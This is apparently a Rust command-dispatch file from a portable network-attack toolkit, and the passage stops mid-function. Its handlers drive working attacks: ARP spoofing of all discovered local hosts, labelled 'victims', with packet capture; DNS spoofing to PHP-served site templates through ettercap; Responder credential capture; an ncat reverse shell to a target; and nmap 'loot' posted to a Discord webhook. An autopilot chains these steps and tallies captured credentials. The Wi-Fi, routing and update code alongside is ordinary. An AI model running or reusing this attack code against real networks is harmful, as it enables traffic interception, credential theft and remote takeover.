use std::{
    fs,
    io::{BufRead, BufReader},
    path::{Path, PathBuf},
    time::{Duration, SystemTime, UNIX_EPOCH},
};

use anyhow::{Context, Result, anyhow, bail};
use chrono::Local;
use regex::Regex;
use serde_json::{Value, json};

use crate::cli::{
    AutopilotCommand, AutopilotStartArgs, BridgeCommand, BridgeStartArgs, BridgeStopArgs, Commands, 
    DiscordCommand, DiscordSendArgs, DnsSpoofCommand, DnsSpoofStartArgs, HardwareCommand,
    LootCommand, LootKind, LootListArgs, LootReadArgs, MitmCommand, MitmStartArgs, NotifyCommand, 
    ProcessCommand, ProcessKillArgs, ProcessStatusArgs, ResponderArgs, ResponderCommand, 
    ReverseCommand, ReverseLaunchArgs, ScanCommand, ScanRunArgs, StatusCommand, SystemCommand, 
    SystemUpdateArgs, WifiBestArgs, WifiCommand, WifiDisconnectArgs, WifiProfileCommand, 
    WifiProfileConnectArgs, WifiProfileDeleteArgs, WifiProfileSaveArgs, WifiRouteCommand, 
    WifiRouteEnsureArgs, WifiRouteMetricArgs, WifiScanArgs, WifiStatusArgs, WifiSwitchArgs,
};
use crate::system::{
    KillResult, WifiProfile, append_payload_log, backup_repository, backup_routing_state,
    build_loot_path, build_manual_embed, build_mitm_pcap_path, compose_status_text,
    connect_wifi_network, default_gateway_ip, delete_wifi_profile, detect_interface,
    disconnect_wifi_interface, enable_ip_forwarding, git_reset_to_remote, interface_gateway,
    kill_process, kill_process_pattern, list_interface_summaries, list_wifi_profiles,
    load_wifi_profile, ping_host, process_running_exact, process_running_pattern,
    read_default_route, read_discord_webhook, read_dns_servers, read_interface_preference,
    read_interface_stats, read_wifi_link_info, restart_system_service, restore_routing_state,
    rewrite_dns_servers, rewrite_ettercap_dns, save_wifi_profile, scan_local_hosts,
    scan_wifi_networks, select_best_interface, select_wifi_interface, send_discord_payload,
    send_scan_to_discord, set_default_route, set_interface_metric, spawn_arpspoof_pair,
    start_bridge_pair, start_ettercap, start_php_server, start_tcpdump_capture, stop_bridge_pair,
    strip_nmap_header, write_interface_preference, write_wifi_profile,
};

pub type HandlerResult = (String, Value);

pub fn dispatch_command(root: &Path, command: Commands) -> Result<HandlerResult> {
    match command {
        Commands::Scan(ScanCommand::Run(args)) => handle_scan_run(root, args),
        Commands::Notify(NotifyCommand::Discord(sub)) => match sub {
            DiscordCommand::Send(args) => handle_discord_send(root, args),
            DiscordCommand::Status => handle_discord_status(root),
        },
        Commands::Responder(sub) => match sub {
            ResponderCommand::On(args) => handle_responder_on(root, args),
            ResponderCommand::Off => handle_responder_off(),
        },
        Commands::Mitm(sub) => match sub {
            MitmCommand::Start(args) => handle_mitm_start(root, args),
            MitmCommand::Stop => handle_mitm_stop(),
        },
        Commands::DnsSpoof(sub) => match sub {
            DnsSpoofCommand::Start(args) => handle_dnsspoof_start(root, args),
            DnsSpoofCommand::Stop => handle_dnsspoof_stop(),
        },
        Commands::Wifi(sub) => match sub {
            WifiCommand::List => handle_wifi_list(),
            WifiCommand::Status(args) => handle_wifi_status(root, args),
            WifiCommand::Best(args) => handle_wifi_best(root, args),
            WifiCommand::Switch(args) => handle_wifi_switch(root, args),
            WifiCommand::Scan(args) => handle_wifi_scan(args),
            WifiCommand::Profile(profile) => match profile {
                WifiProfileCommand::List => handle_wifi_profile_list(root),
                WifiProfileCommand::Save(args) => handle_wifi_profile_save(root, args),
                WifiProfileCommand::Connect(args) => handle_wifi_profile_connect(root, args),
                WifiProfileCommand::Delete(args) => handle_wifi_profile_delete(root, args),
            },
            WifiCommand::Disconnect(args) => handle_wifi_disconnect(args),
            WifiCommand::Route(route) => match route {
                WifiRouteCommand::Status => handle_wifi_route_status(root),
                WifiRouteCommand::Ensure(args) => handle_wifi_route_ensure(root, args),
                WifiRouteCommand::Backup => handle_wifi_route_backup(root),
                WifiRouteCommand::Restore => handle_wifi_route_restore(root),
                WifiRouteCommand::SetMetric(args) => handle_wifi_route_metric(args),
            },
        },
        Commands::Loot(sub) => match sub {
            LootCommand::List(args) => handle_loot_list(root, args),
            LootCommand::Read(args) => handle_loot_read(root, args),
        },
        Commands::Process(sub) => match sub {
            ProcessCommand::Kill(args) => handle_process_kill(args),
            ProcessCommand::Status(args) => handle_process_status(args),
        },
        Commands::Status(StatusCommand::Summary) => handle_status_summary(),
        Commands::Status(StatusCommand::Network) => handle_network_status(),
        Commands::Reverse(ReverseCommand::Launch(args)) => handle_reverse_launch(root, args),
        Commands::System(SystemCommand::Update(args)) => handle_system_update(root, args),
        Commands::Bridge(sub) => match sub {
            BridgeCommand::Start(args) => handle_bridge_start(root, args),
            BridgeCommand::Stop(args) => handle_bridge_stop(root, args),
        },
        Commands::Autopilot(sub) => match sub {
            AutopilotCommand::Start(args) => handle_autopilot_start(root, args),
            AutopilotCommand::Stop => handle_autopilot_stop(),
            AutopilotCommand::Status => handle_autopilot_status(),
        },
        Commands::Hardware(cmd) => match cmd {
            HardwareCommand::Detect => handle_hardware_detect(),
        },
    }
}

fn handle_scan_run(root: &Path, args: ScanRunArgs) -> Result<HandlerResult> {
    run_scan_with_progress(root, args, |_, _| {})
}

pub fn run_scan_with_progress<F>(
    root: &Path,
    args: ScanRunArgs,
    mut on_progress: F,
) -> Result<HandlerResult>
where
    F: FnMut(f32, &str),
{
    let ScanRunArgs {
        label,
        nmap_args,
        interface,
        target,
        output_path,
        no_discord,
    } = args;

    let interface_info = detect_interface(interface)?;
    let target = target.unwrap_or_else(|| interface_info.network_cidr());

    let loot_path = output_path.unwrap_or(build_loot_path(root, &label)?);
    if let Some(parent) = loot_path.parent() {
        std::fs::create_dir_all(parent).context("creating loot directory")?;
    }

    let mut cmd = std::process::Command::new("nmap");
    if !nmap_args.is_empty() {
        cmd.args(&nmap_args);
    }
    
    // Add stats-every to get progress updates
    cmd.arg("--stats-every").arg("1s");
    
    cmd.arg("-oN")
        .arg(&loot_path)
        .arg("-S")
        .arg(interface_info.address.to_string())
        .arg("-e")
        .arg(&interface_info.name)
        .arg(&target)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::null())
        .stdin(std::process::Stdio::null());

    let mut child = cmd.spawn().context("failed to launch nmap")?;
    
    if let Some(stdout) = child.stdout.take() {
        let reader = BufReader::new(stdout);
        // Regex to match: "SYN Stealth Scan Timing: About 15.50% done"
        let re_timing = Regex::new(r"(.*) Timing: About (\d+\.\d+)% done").unwrap();

        for line in reader.lines() {
            if let Ok(line) = line {
                if let Some(caps) = re_timing.captures(&line) {
                    if let (Some(task), Some(pct)) = (caps.get(1), caps.get(2)) {
                        if let Ok(val) = pct.as_str().parse::<f32>() {
                            on_progress(val, task.as_str().trim());
                        }
                    }
                }
            }
        }
    }

    let status = child.wait().context("failed to wait for nmap")?;
    if !status.success() {
        bail!("nmap exited with status {}", status);
    }

    strip_nmap_header(&loot_path)?;

    let mut discord_sent = false;
    if !no_discord {
        discord_sent =
            send_scan_to_discord(root, &label, &loot_path, &target, &interface_info.name)?;
    }

    let output_path_str = loot_path.to_string_lossy().to_string();
    let data = json!({
        "label": label,
        "interface": interface_info.name,
        "target": target,
        "output_path": output_path_str,
        "discord_notified": discord_sent,
    });

    Ok(("Nmap scan completed and loot saved".to_string(), data))
}

fn handle_discord_send(root: &Path, args: DiscordSendArgs) -> Result<HandlerResult> {
    let DiscordSendArgs {
        title,
        message,
        file,
        target,
        interface,
    } = args;

    if message.is_none() && file.is_none() {
        bail!("Either --message or --file must be provided");
    }

    let embed = build_manual_embed(&title, target.as_deref(), interface.as_deref());
    let sent = send_discord_payload(root, Some(embed), file.as_deref(), message.as_deref())?;

    let data = json!({
        "sent": sent,
        "file": file.as_ref().map(|p| p.to_string_lossy().to_string()),
    });

    let message = if sent {
        "Discord notification sent".to_string()
    } else {
        "Discord webhook not configured".to_string()
    };

    Ok((message, data))
}

fn handle_discord_status(root: &Path) -> Result<HandlerResult> {
    let configured = read_discord_webhook(root)?.is_some();
    let data = json!({ "configured": configured });
    let message = if configured {
        "Discord webhook configured".to_string()
    } else {
        "Discord webhook missing".to_string()
    };
    Ok((message, data))
}

fn handle_responder_on(root: &Path, args: ResponderArgs) -> Result<HandlerResult> {
    if process_running_pattern("Responder.py")? {
        let data = json!({ "already_running": true });
        return Ok(("Responder already running".to_string(), data));
    }

    let ResponderArgs { interface } = args;
    let interface = match interface {
        Some(name) => name,
        None => detect_interface(None)?.name,
    };

    let responder_script = root.join("Responder/Responder.py");
    if !responder_script.exists() {
        bail!(
            "Responder script not found at {}",
            responder_script.display()
        );
    }

    let mut cmd = std::process::Command::new("python3");
    cmd.arg(&responder_script)
        .arg("-Q")
        .arg("-I")
        .arg(&interface)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null());
    cmd.spawn().context("launching Responder")?;

    let data = json!({ "interface": interface });
    Ok(("Responder started".to_string(), data))
}

fn handle_responder_off() -> Result<HandlerResult> {
    match kill_process_pattern("Responder.py")? {
        KillResult::Terminated => {
            let data = json!({ "stopped": true });
            Ok(("Responder stopped".to_string(), data))
        }
        KillResult::NotFound => {
            let data = json!({ "stopped": false });
            Ok(("Responder was not running".to_string(), data))
        }
    }
}

fn handle_mitm_start(root: &Path, args: MitmStartArgs) -> Result<HandlerResult> {
    let MitmStartArgs { interface, network } = args;
    let interface_info = detect_interface(interface)?;
    let gateway = default_gateway_ip().context("determining default gateway for MITM")?;
    let network = network.unwrap_or_else(|| interface_info.network_cidr());

    let _ = kill_process("arpspoof");
    let _ = kill_process("tcpdump");

    let hosts = scan_local_hosts(&interface_info.name)?;
    let victims: Vec<_> = hosts
        .into_iter()
        .filter(|host| host.ip != gateway)
        .collect();
    if victims.is_empty() {
        bail!("No victims discovered on the local network");
    }

    enable_ip_forwarding(true)?;

    for host in &victims {
        spawn_arpspoof_pair(&interface_info.name, gateway, host)?;
    }

    let pcap_path = build_mitm_pcap_path(root)?;
    let pcap_display = pcap_path.to_string_lossy().to_string();
    start_tcpdump_capture(&interface_info.name, &pcap_path)?;

    let data = json!({
        "interface": interface_info.name,
        "victim_count": victims.len(),
        "gateway": gateway,
        "pcap_path": pcap_display,
        "network": network,
    });

    Ok(("MITM started".to_string(), data))
}

fn handle_mitm_stop() -> Result<HandlerResult> {
    let _ = kill_process("arpspoof");
    let _ = kill_process("tcpdump");
    enable_ip_forwarding(false)?;

    let data = json!({ "stopped": true });
    Ok(("MITM stopped".to_string(), data))
}

fn handle_dnsspoof_start(root: &Path, args: DnsSpoofStartArgs) -> Result<HandlerResult> {
    let DnsSpoofStartArgs { site, interface } = args;
    let interface_info = detect_interface(interface)?;
    let site_dir = root.join("DNSSpoof").join("sites").join(&site);
    if !site_dir.exists() {
        bail!("Site template not found: {}", site_dir.display());
    }

    let _ = kill_process_pattern("php -S 0.0.0.0:80");
    let _ = kill_process_pattern("ettercap");

    rewrite_ettercap_dns(interface_info.address)?;
    start_php_server(&site_dir)?;
    start_ettercap(&interface_info.name)?;

    let data = json!({
        "interface": interface_info.name,
        "site": site,
    });
    Ok(("DNS spoofing started".to_string(), data))
}

fn handle_dnsspoof_stop() -> Result<HandlerResult> {
    let _ = kill_process_pattern("php -S 0.0.0.0:80");
    let _ = kill_process_pattern("php");
    let _ = kill_process_pattern("ettercap");
    let data = json!({ "stopped": true });
    Ok(("DNS spoofing stopped".to_string(), data))
}

fn handle_loot_list(root: &Path, args: LootListArgs) -> Result<HandlerResult> {
    let dir = loot_directory(root, args.kind);
    let kind_label = loot_kind_label(args.kind);
    let mut entries = Vec::new();

    if dir.exists() {
        for entry in fs::read_dir(&dir).with_context(|| format!("listing {}", dir.display()))? {
            let entry = entry?;
            let metadata = entry.metadata()?;
            if !metadata.is_file() {
                continue;
            }
            let modified = metadata.modified().unwrap_or(SystemTime::UNIX_EPOCH);
            let modified_ts = modified
                .duration_since(UNIX_EPOCH)
                .unwrap_or(Duration::ZERO)
                .as_secs();
            let file_name = entry.file_name();
            let path = entry.path();
            entries.push((
                modified,
                json!({
                    "name": file_name.to_string_lossy(),
                    "path": path.to_string_lossy(),
                    "size": metadata.len(),
                    "modified": modified_ts,
                }),
            ));
        }
    }

    entries.sort_by(|a, b| b.0.cmp(&a.0));
    let files: Vec<Value> = entries.into_iter().map(|(_, value)| value).collect();

    let data = json!({
        "kind": kind_label,
        "directory": dir.to_string_lossy(),
        "files": files,
    });
    Ok(("Loot listing generated".to_string(), data))
}

fn handle_loot_read(root: &Path, args: LootReadArgs) -> Result<HandlerResult> {
    let LootReadArgs { path, max_lines } = args;
    let resolved = resolve_loot_path(root, &path)?;
    let contents =
        fs::read_to_string(&resolved).with_context(|| format!("reading {}", resolved.display()))?;
    let mut lines = Vec::new();
    let mut truncated = false;
    for (idx, line) in contents.lines().enumerate() {
        if idx >= max_lines {
            truncated = true;
            break;
        }
        lines.push(line.to_string());
    }

    let data = json!({
        "path": resolved.to_string_lossy(),
        "line_count": lines.len(),
        "truncated": truncated,
        "lines": lines,
    });

    Ok(("Loot file read".to_string(), data))
}

fn handle_process_kill(args: ProcessKillArgs) -> Result<HandlerResult> {
    if args.names.is_empty() {
        bail!("At least one --name argument is required");
    }

    let mut killed = Vec::new();
    let mut not_found = Vec::new();

    for name in args.names {
        match kill_process(&name)? {
            KillResult::Terminated => killed.push(name),
            KillResult::NotFound => not_found.push(name),
        }
    }

    let message = if killed.is_empty() {
        "No matching processes were running".to_string()
    } else if not_found.is_empty() {
        "Processes terminated".to_string()
    } else {
        "Some processes terminated".to_string()
    };

    let data = json!({
        "killed": killed,
        "not_found": not_found,
    });

    Ok((message, data))
}

fn handle_process_status(args: ProcessStatusArgs) -> Result<HandlerResult> {
    if args.names.is_empty() {
        bail!("At least one --name argument is required");
    }

    let mut running = Vec::new();
    let mut not_running = Vec::new();

    for name in args.names {
        let is_running = process_running_exact(&name)?;
        if is_running {
            running.push(name);
        } else {
            not_running.push(name);
        }
    }

    let message = if running.is_empty() {
        "No specified processes are running".to_string()
    } else if not_running.is_empty() {
        "All specified processes are running".to_string()
    } else {
        "Some specified processes are running".to_string()
    };

    let data = json!({
        "running": running,
        "not_running": not_running,
    });

    Ok((message, data))
}

fn handle_status_summary() -> Result<HandlerResult> {
    let scan_running = process_running_exact("nmap")?;
    let mitm_running = process_running_exact("tcpdump")? || process_running_exact("arpspoof")?;
    let dnsspoof_running = process_running_exact("ettercap")?;
    let responder_running = process_running_pattern("Responder.py")?;

    let status_text = compose_status_text(
        scan_running,
        mitm_running,
        dnsspoof_running,
        responder_running,
    );

    let data = json!({
        "scan_running": scan_running,
        "mitm_running": mitm_running,
        "dnsspoof_running": dnsspoof_running,
        "responder_running": responder_running,
        "status_text": status_text,
    });

    Ok(("Status collected".to_string(), data))
}

fn handle_network_status() -> Result<HandlerResult> {
    let interface_info = detect_interface(None).ok();

    let gateway_ip = default_gateway_ip().ok();
    let gateway_reachable = match gateway_ip {
        Some(ip) => ping_host(&ip.to_string(), Duration::from_secs(2)).unwrap_or(false),
        None => false,
    };
    let internet_reachable = ping_host("1.1.1.1", Duration::from_secs(2)).unwrap_or(false);

    let interface_stats = interface_info
        .as_ref()
        .and_then(|info| read_interface_stats(&info.name).ok());

    let dns_servers = read_dns_servers().unwrap_or_default();

    let mut data = serde_json::Map::new();
    if let Some(info) = interface_info.as_ref() {
        data.insert("interface".into(), Value::String(info.name.clone()));
        data.insert("address".into(), Value::String(info.address.to_string()));
        data.insert("cidr".into(), Value::String(info.network_cidr()));
    }
    if let Some(gw) = gateway_ip {
        data.insert("gateway".into(), Value::String(gw.to_string()));
    }
    data.insert("gateway_reachable".into(), Value::Bool(gateway_reachable));
    data.insert("internet_reachable".into(), Value::Bool(internet_reachable));
    if let Some(stats) = interface_stats {
        data.insert("rx_bytes".into(), Value::Number(stats.rx_bytes.into()));
        data.insert("tx_bytes".into(), Value::Number(stats.tx_bytes.into()));
        data.insert("oper_state".into(), Value::String(stats.oper_state.clone()));
    }
    data.insert(
        "dns_servers".into(),
        Value::Array(dns_servers.into_iter().map(Value::String).collect()),
    );

    Ok(("Network health collected".to_string(), Value::Object(data)))
}

fn handle_reverse_launch(root: &Path, args: ReverseLaunchArgs) -> Result<HandlerResult> {
    let ReverseLaunchArgs {
        target,
        port,
        shell,
        interface,
    } = args;

    let interface_info = detect_interface(interface)?;
    let mut cmd = std::process::Command::new("ncat");
    cmd.arg(&target)
        .arg(port.to_string())
        .arg("-e")
        .arg(&shell)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .arg("-s")
        .arg(interface_info.address.to_string());

    let child = cmd.spawn().context("launching ncat reverse shell")?;

    let log_entry = format!(
        "[{}] reverse-shell -> {}:{} via {} (pid {})",
        chrono::Local::now().format("%Y-%m-%d %H:%M:%S"),
        target,
        port,
        interface_info.name,
        child.id(),
    );
    let _ = append_payload_log(root, &log_entry);

    let data = json!({
        "target": target,
        "port": port,
        "interface": interface_info.name,
        "pid": child.id(),
        "shell": shell,
    });
    Ok(("Reverse shell launched".to_string(), data))
}

fn handle_wifi_list() -> Result<HandlerResult> {
    let mut interfaces = list_interface_summaries()?;
    interfaces.sort_by(|a, b| a.name.cmp(&b.name));
    let data = json!({ "interfaces": interfaces });
    Ok(("Interface list generated".to_string(), data))
}

fn handle_wifi_status(root: &Path, args: WifiStatusArgs) -> Result<HandlerResult> {
    log::info!("Collecting WiFi status information");
    
    let interface_name = args.interface.clone();
    let info = if let Some(name) = interface_name.clone() {
        log::info!("Getting status for specified interface: {name}");
        match detect_interface(Some(name.clone())) {
            Ok(i) => i,
            Err(e) => {
                log::error!("Failed to detect interface {name}: {e}");
                bail!("Failed to get interface info for {name}: {e}");
            }
        }
    } else {
        log::info!("Auto-detecting default interface");
        match detect_interface(None) {
            Ok(i) => {
                log::info!("Detected default interface: {}", i.name);
                i
            },
            Err(e) => {
                log::error!("Failed to detect default interface: {e}");
                bail!("Failed to detect default interface: {e}");
            }
        }
    };
    
    let stats = read_interface_stats(&info.name).ok();
    let gateway = if let Some(name) = interface_name.clone() {
        interface_gateway(&name)
            .ok()
            .flatten()
            .or_else(|| default_gateway_ip().ok())
    } else {
        interface_gateway(&info.name)
            .ok()
            .flatten()
            .or_else(|| default_gateway_ip().ok())
    };
    
    let preferred = read_interface_preference(root, "system_preferred")
        .ok()
        .flatten();
    
    let link = read_wifi_link_info(&info.name);
    
    // Determine if this is the active interface
    let default_route = read_default_route().ok().flatten();
    let is_active = default_route
        .as_ref()
        .and_then(|r| r.interface.as_ref())
        .map(|iface| iface == &info.name)
        .unwrap_or(false);
    
    log::info!("Interface {} status: active={}, connected={}", 
        info.name, is_active, link.connected);

    let data = json!({
        "interface": info.name,
        "address": info.address,
        "cidr": info.network_cidr(),
        "stats": stats,
        "gateway": gateway,
        "preferred": preferred,
        "connected": link.connected,
        "ssid": link.ssid,
        "signal_dbm": link.signal_dbm,
        "tx_bitrate": link.tx_bitrate,
        "is_active": is_active,
        "default_route_interface": default_route.and_then(|r| r.interface),
    });
    Ok(("Interface status collected".to_string(), data))
}

fn handle_wifi_best(root: &Path, args: WifiBestArgs) -> Result<HandlerResult> {
    let interface =
        select_best_interface(root, args.prefer_wifi)?.unwrap_or_else(|| "eth0".to_string());
    let data = json!({ "interface": interface });
    Ok(("Best interface selected".to_string(), data))
}

fn handle_wifi_switch(root: &Path, args: WifiSwitchArgs) -> Result<HandlerResult> {
    let interface = args.interface;
    write_interface_preference(root, "system_preferred", &interface)?;
    let data = json!({ "interface": interface });
    Ok(("Interface preference saved".to_string(), data))
}

fn handle_wifi_route_status(_root: &Path) -> Result<HandlerResult> {
    let default_route = read_default_route().unwrap_or(None);
    let interfaces = list_interface_summaries()?;
    let dns_servers = read_dns_servers().unwrap_or_default();
    let data = json!({
        "default_route": default_route,
        "interfaces": interfaces,
        "dns_servers": dns_servers,
    });
    Ok(("Routing status collected".to_string(), data))
}

fn handle_wifi_route_ensure(root: &Path, args: WifiRouteEnsureArgs) -> Result<HandlerResult> {
    let WifiRouteEnsureArgs { interface } = args;
    let interface_info = detect_interface(Some(interface.clone()))?;

    let gateway = interface_gateway(&interface)?
        .ok_or_else(|| anyhow!("No gateway found for {interface}"))?;

    set_default_route(&interface, gateway)?;
    let _ = rewrite_dns_servers(&interface, gateway);

    write_interface_preference(root, "system_preferred", &interface)?;
    let ping_success = ping_host("8.8.8.8", Duration::from_secs(2)).unwrap_or(false);

    let data = json!({
        "interface": interface,
        "ip": interface_info.address,
        "gateway": gateway,
        "ping_success": ping_success,
    });
    Ok(("Default route updated".to_string(), data))
}

fn handle_wifi_route_backup(root: &Path) -> Result<HandlerResult> {
    let path = backup_routing_state(root)?;
    let data = json!({ "path": path });
    Ok(("Routing configuration backed up".to_string(), data))
}

fn handle_wifi_route_restore(root: &Path) -> Result<HandlerResult> {
    restore_routing_state(root)?;
    Ok(("Routing configuration restored".to_string(), json!({})))
}

fn handle_wifi_route_metric(args: WifiRouteMetricArgs) -> Result<HandlerResult> {
    set_interface_metric(&args.interface, args.metric)?;
    let data = json!({
        "interface": args.interface,
        "metric": args.metric,
    });
    Ok(("Interface metric updated".to_string(), data))
}

fn handle_system_update(root: &Path, args: SystemUpdateArgs) -> Result<HandlerResult> {
    run_system_update_with_progress(root, args, |_, _| {})
}

pub fn run_system_update_with_progress<F>(
    root: &Path,
    args: SystemUpdateArgs,
    mut on_progress: F,
) -> Result<HandlerResult>
where
    F: FnMut(f32, &str),
{
    on_progress(0.1, "Creating backup...");
    let backup = backup_repository(root, args.backup_dir.as_deref())?;

    on_progress(0.3, "Fetching updates...");
    git_reset_to_remote(root, &args.remote, &args.branch)?;

    on_progress(0.5, "Compiling binary...");
    // We assume cargo is available in the path
    let status = std::process::Command::new("cargo")
        .arg("build")
        .arg("--release")
        .current_dir(root)
        .status()
        .context("executing cargo build --release")?;

    if !status.success() {
        bail!("Compilation failed with status {}", status);
    }

    on_progress(0.9, "Restarting service...");
    restart_system_service(&args.service)?;

    let data = json!({
        "backup_path": backup,
        "service": args.service,
        "remote": args.remote,
        "branch": args.branch,
    });
    Ok(("Repository updated, compiled, and service restarted".to_string(), data))
}

fn handle_bridge_start(root: &Path, args: BridgeStartArgs) -> Result<HandlerResult> {
    let backup = backup_routing_state(root)?;
    start_bridge_pair(&args.interface_a, &args.interface_b)?;
    let pcap_path = build_mitm_pcap_path(root)?;
    start_tcpdump_capture("br0", &pcap_path)?;
    let data = json!({
        "bridge": "br0",
        "interfaces": [args.interface_a, args.interface_b],
        "capture_path": pcap_path,
        "routing_backup": backup,
    });
    Ok(("Transparent bridge enabled".to_string(), data))
}

fn handle_bridge_stop(root: &Path, args: BridgeStopArgs) -> Result<HandlerResult> {
    let _ = kill_process("tcpdump");
    stop_bridge_pair(&args.interface_a, &args.interface_b)?;
    if let Err(err) = restore_routing_state(root) {
        log::warn!("bridge stop: failed to restore routing: {err}");
    }
    let data = json!({
        "bridge": "br0",
        "interfaces": [args.interface_a, args.interface_b],
        "routing_restored": true,
    });
    Ok(("Transparent bridge disabled".to_string(), data))
}

// Global autopilot engine instance (lazy initialized)
use std::sync::OnceLock;
use crate::autopilot::{AutopilotEngine, AutopilotConfig};

static AUTOPILOT: OnceLock<AutopilotEngine> = OnceLock::new();

fn get_autopilot() -> &'static AutopilotEngine {
    AUTOPILOT.get_or_init(|| AutopilotEngine::new())
}

fn handle_autopilot_start(root: &Path, args: AutopilotStartArgs) -> Result<HandlerResult> {
    let config = AutopilotConfig {
        mode: format!("{:?}", args.mode),
        interface: args.interface.clone(),
        scan: args.scan,
        mitm: args.mitm,
        responder: args.responder,
        dns_spoof: args.dns_spoof.clone(),
        duration: args.duration,
        check_interval: args.check_interval,
    };

    let autopilot = get_autopilot();
    autopilot.start(root, args.mode, config)?;

    let data = json!({
        "mode": format!("{:?}", args.mode),
        "interface": args.interface,
        "scan": args.scan,
        "mitm": args.mitm,
        "responder": args.responder,
        "dns_spoof": args.dns_spoof,
        "duration": args.duration,
    });

    Ok(("Autopilot started".to_string(), data))
}

fn handle_autopilot_stop() -> Result<HandlerResult> {
    let autopilot = get_autopilot();
    autopilot.stop()?;

    let data = json!({
        "stopped": true,
    });

    Ok(("Autopilot stopped".to_string(), data))
}

fn handle_autopilot_status() -> Result<HandlerResult> {
    let autopilot = get_autopilot();
    let status = autopilot.get_status();

    let data = json!({
        "running": status.running,
        "mode": status.mode,
        "phase": status.phase,
        "elapsed_secs": status.elapsed_secs,
        "hosts_found": status.hosts_found,
        "credentials_captured": status.credentials_captured,
        "packets_captured": status.packets_captured,
        "errors": status.errors,
    });

    Ok(("Autopilot status".to_string(), data))
}


fn handle_wifi_scan(args: WifiScanArgs) -> Result<HandlerResult> {
    log::info!("Starting WiFi scan");
    
    let interface = match select_wifi_interface(args.interface) {
        Ok(iface) => {
            log::info!("Selected interface: {iface}");
            iface
        },
        Err(e) => {
            log::error!("Failed to select WiFi interface: {e}");
            bail!("Failed to select WiFi interface: {e}");
        }
    };
    
    let networks = match scan_wifi_networks(&interface) {
        Ok(nets) => {
            log::info!("Scan completed, found {} network(s)", nets.len());
            nets
        },
        Err(e) => {
            log::error!("WiFi scan failed on {interface}: {e}");
            bail!("WiFi scan failed: {e}");
        }
    };
    
    let data = json!({
        "interface": interface,
        "networks": networks,
        "count": networks.len(),
    });
    Ok(("Wi-Fi scan completed".to_string(), data))
}

fn handle_wifi_profile_list(root: &Path) -> Result<HandlerResult> {
    log::info!("Listing WiFi profiles");
    
    let profiles = match list_wifi_profiles(root) {
        Ok(p) => {
            log::info!("Found {} profile(s)", p.len());
            p
        },
        Err(e) => {
            log::error!("Failed to list WiFi profiles: {e}");
            bail!("Failed to list WiFi profiles: {e}");
        }
    };
    
    let data = json!({ 
        "profiles": profiles,
        "count": profiles.len(),
    });
    Ok(("Wi-Fi profiles loaded".to_string(), data))
}

fn handle_wifi_profile_save(root: &Path, args: WifiProfileSaveArgs) -> Result<HandlerResult> {
    let WifiProfileSaveArgs {
        ssid,
        password,
        interface,
        priority,
        auto_connect,
    } = args;
    
    log::info!("Saving WiFi profile for SSID: {ssid}");

    let profile = WifiProfile {
        ssid: ssid.clone(),
        password: Some(password),
        interface,
        priority: priority as i32,
        auto_connect: auto_connect.unwrap_or(true),
        created: None,
        last_used: None,
        notes: None,
    };

    let path = match save_wifi_profile(root, &profile) {
        Ok(p) => {
            log::info!("Profile saved successfully to: {}", p.display());
            p
        },
        Err(e) => {
            log::error!("Failed to save WiFi profile for {ssid}: {e}");
            bail!("Failed to save WiFi profile: {e}");
        }
    };
    
    let data = json!({
        "ssid": ssid,
        "path": path,
    });
    Ok(("Wi-Fi profile saved".to_string(), data))
}

fn handle_wifi_profile_connect(root: &Path, args: WifiProfileConnectArgs) -> Result<HandlerResult> {
    log::info!("Attempting WiFi profile connection");
    
    let interface = match select_wifi_interface(args.interface.clone()) {
        Ok(iface) => {
            log::info!("Selected interface: {iface}");
            iface
        },
        Err(e) => {
            log::error!("Failed to select interface: {e}");
            bail!("Failed to select interface: {e}");
        }
    };
    
    let stored = if let Some(ref profile_name) = args.profile {
        log::info!("Loading profile: {profile_name}");
        match load_wifi_profile(root, profile_name) {
            Ok(p) => p,
            Err(e) => {
                log::error!("Failed to load profile '{profile_name}': {e}");
                bail!("Failed to load profile: {e}");
            }
        }
    } else if let Some(ref ssid) = args.ssid {
        log::info!("Loading profile by SSID: {ssid}");
        match load_wifi_profile(root, ssid) {
            Ok(p) => p,
            Err(e) => {
                log::warn!("Could not load profile for SSID '{ssid}': {e}");
                None
            }
        }
    } else {
        None
    };

    let ssid = args
        .ssid
        .clone()
        .or_else(|| stored.as_ref().map(|p| p.profile.ssid.clone()))
        .ok_or_else(|| {
            log::error!("No SSID provided and no profile found");
            anyhow!("Provide --ssid or --profile when connecting to Wi-Fi")
        })?;

    let password = args
        .password
        .clone()
        .or_else(|| stored.as_ref().and_then(|p| p.profile.password.clone()));

    log::info!("Connecting to SSID: {ssid} on interface: {interface}");
    
    if let Err(e) = connect_wifi_network(&interface, &ssid, password.as_deref()) {
        log::error!("Failed to connect to {ssid}: {e}");
        bail!("WiFi connection failed: {e}");
    }
    
    log::info!("WiFi connection successful");

    let mut remembered = false;
    if let Some(mut stored_profile) = stored {
        stored_profile.profile.last_used = Some(Local::now().to_rfc3339());
        if args.remember {
            if let Some(pass) = password.clone() {
                stored_profile.profile.password = Some(pass);
                log::info!("Updating stored profile with new password");
            } else {
                log::warn!("--remember flag set but no password available to store");
            }
        }
        if let Err(e) = write_wifi_profile(&stored_profile.path, &stored_profile.profile) {
            log::error!("Failed to update profile: {e}");
        } else {
            remembered = true;
            log::info!("Profile updated successfully");
        }
    } else if args.remember {
        if let Some(pass) = password.clone() {
            let profile = WifiProfile {
                ssid: ssid.clone(),
                password: Some(pass),
                interface: args.interface.clone().unwrap_or_else(|| "auto".to_string()),
                priority: 1,
                auto_connect: true,
                created: None,
                last_used: None,
                notes: None,
            };
            match save_wifi_profile(root, &profile) {
                Ok(_) => {
                    remembered = true;
                    log::info!("New profile created and saved");
                },
                Err(e) => {
                    log::error!("Failed to save new profile: {e}");
                }
            }
        } else {
            log::warn!("--remember flag ignored because no password was supplied");
        }
    }

    let data = json!({
        "interface": interface,
        "ssid": ssid,
        "remembered": remembered,
    });
    Ok(("Wi-Fi connection triggered".to_string(), data))
}

fn handle_wifi_profile_delete(root: &Path, args: WifiProfileDeleteArgs) -> Result<HandlerResult> {
    log::info!("Attempting to delete WiFi profile: {}", args.ssid);
    
    match delete_wifi_profile(root, &args.ssid) {
        Ok(()) => {
            log::info!("Profile deleted successfully: {}", args.ssid);
            let data = json!({ "ssid": args.ssid });
            Ok(("Wi-Fi profile deleted".to_string(), data))
        },
        Err(e) => {
